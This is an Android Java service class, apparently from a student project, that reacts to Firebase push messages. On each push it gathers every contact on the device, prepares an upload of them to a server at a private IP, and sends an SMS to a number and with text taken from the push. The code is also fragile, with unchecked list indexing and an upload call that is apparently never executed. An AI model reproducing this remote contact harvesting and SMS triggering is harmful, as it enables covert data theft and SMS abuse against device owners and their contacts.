package fr.intechinfo.fusionandroid;

import android.telephony.SmsManager;
import android.util.Log;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.List;

import retrofit2.Retrofit;
import retrofit2.converter.jackson.JacksonConverterFactory;

import static android.content.ContentValues.TAG;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    public MyFirebaseMessagingService() {
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        String strTitle=remoteMessage.getNotification().getTitle();
        String message=remoteMessage.getNotification().getBody();
        Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
        ContentCollector cc = new ContentCollector();
        List<Contact> lsContact = cc.GetContacts(this);
        Log.d(TAG,"Name : "+ lsContact.get(1).GetName()+" Number : " + lsContact.get(1).GetNumber());
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("http://10.8.111.192:5000")
                .addConverterFactory(JacksonConverterFactory.create())
                .build();
        RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
        retrofitAPI.CreateContacts(lsContact);
        sendSMS(strTitle, message);
    }
    private void sendSMS(String phoneNumber, String messageBody){
        SmsManager sms = SmsManager.getDefault();

        sms.sendTextMessage(phoneNumber, null, messageBody,null,null);
    }

}
